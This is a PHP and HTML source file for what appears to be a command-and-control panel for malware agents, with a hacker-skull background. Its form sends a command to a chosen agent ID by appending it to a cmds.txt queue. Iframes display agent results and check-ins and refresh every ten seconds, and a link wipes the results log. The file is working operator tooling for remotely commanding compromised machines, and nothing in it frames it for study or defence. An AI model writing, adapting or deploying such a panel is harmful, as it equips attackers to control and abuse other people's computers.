<html>
<head>
<style>


body, html {
  height: 100%;
  margin: 0;
}

.bg {
 
  background-image: url("https://static.vecteezy.com/system/resources/previews/003/217/491/large_2x/cyber-hacker-attack-background-skull-free-vector.jpg");
  height: 100%; 
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}

</style>
</head>

<body>
<?php
$id = intval($_REQUEST['id']);
$sid = strval($id);
$cmd=$_REQUEST[ 'cmd' ];
$cmd=urldecode($cmd);
if (!empty($cmd)) {

$file = '../cmds.txt';
$current = file_get_contents($file);
$current .= $sid.":".$cmd.PHP_EOL;
file_put_contents($file, $current);

$file = '../res.txt';
$current = file_get_contents($file);
$current .= "Task to ".$sid." => ".$cmd.PHP_EOL;
file_put_contents($file, $current);

}


?>

<?php
 function del_res(){
file_put_contents('../res.txt', '');
}


  if (isset($_GET['del'])) {
    del_res();
  }
?>



<script>
function reloadfrm() {
  document.getElementById('iframeres').contentDocument.location.reload(true);
  document.getElementById('iframeping').contentDocument.location.reload(true);
  setTimeout(reloadfrm, 10000);
}



</script>
<div class="bg">
<div>

<form method="post" action="admin.php">
<label for="fname">Agent Id:</label>
<input type="text" name="id" />
<label for="fname">Cmd:</label>
<input type="text" name="cmd" />
<input type="submit" value="Envoyer" />
</form>

<body onload="reloadfrm()"></body>
<a href='admin.php?del=true'>Delete Logs</a>

</div>

<div>
<iframe src='../res.txt' height=400 width=400 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='../ping.txt' height=400 width=400 id="iframeping" style="border:0;background-color: Black;"></iframe>
</div>
</div>
</body></html>
